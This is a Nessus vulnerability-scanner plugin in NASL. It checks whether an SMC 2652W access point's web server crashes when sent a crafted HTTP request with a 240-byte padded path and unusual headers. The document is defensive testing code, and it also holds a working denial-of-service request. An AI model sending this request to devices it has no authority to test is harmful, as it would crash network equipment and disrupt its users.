#
# Copyright 2002 by John Lampe ... j_lampe@bellsouth.net
# BUG FOUND WITH SPIKE 2.7
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - fill the Host header to work through a transparent proxy [RD]
# - use http_is_dead() to determine success of script [RD]
# - Revised plugin title, changed family, added OSVDB ref (6/16/09)
# - Updated to use compat.inc, added CVSS score (11/20/2009)



include("compat.inc");

if(description)
{
    script_id(11141);
    script_version ("$Revision: 1.25 $");
    script_osvdb_id(55105);

    script_name(english:"SMC 2652W AP Malformed HTTP Request Remote DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote SMC 2652W Access point web server crashes when sent a 
specially formatted HTTP request." );
 script_set_attribute(attribute:"solution", value:
"Contact vendor for a fix" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/10/13");
 script_cvs_date("$Date: 2013/01/25 01:19:10 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


    script_summary(english:"Crash SMC Access Point");
    script_category(ACT_FLOOD);
    script_copyright(english:"This script is Copyright (C) 2002-2013 John Lampe...j_lampe@bellsouth.net");
    script_family(english:"Web Servers");
    script_dependencies("http_version.nasl");
    script_require_ports("Services/www", 80);
    exit(0);
}

#
# The script code starts here
#
# found with SPIKE 2.7
# req string directly horked from SPIKE API

include("global_settings.inc");
include ("http_func.inc");

if (report_paranoia < 2)
{
# The only banner we have is "SMC Wireless Router 7004VWBR"
  b = get_http_banner(port: port);
  if ("SMC" >!< b)
    exit(1, "The web server on port "+port+" does not look like an SMC Access Point.");
}

port = get_http_port(default:80);

if(http_is_dead(port: port))exit(0);

req = string("GET /", crap(240), ".html?OpenElement&FieldElemFormat=gif HTTP/1.1\r\n");
req = string(req, "Referer: http://localhost/bob\r\n");
req = string(req, "Content-Type: application/x-www-form-urlencoded\r\n");
req = string(req, "Connection: Keep-Alive\r\n");
req = string(req, "Cookie: VARIABLE=FOOBAR; path=/\r\n");
req = string(req, "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n");
req = string(req, "Variable: result\r\n");
req = string(req, "Host: ", get_host_name(), "\r\nContent-length: 13\r\n");
req = string(req, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n");
req = string(req, "Accept-Encoding: gzip\r\nAccept-Language:en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n");


soc = http_open_socket(port);
if (soc) {
  send(socket:soc, data:req);
  close(soc);
}


if(http_is_dead(port: port, retry: 3))
{
  security_warning(port);
}





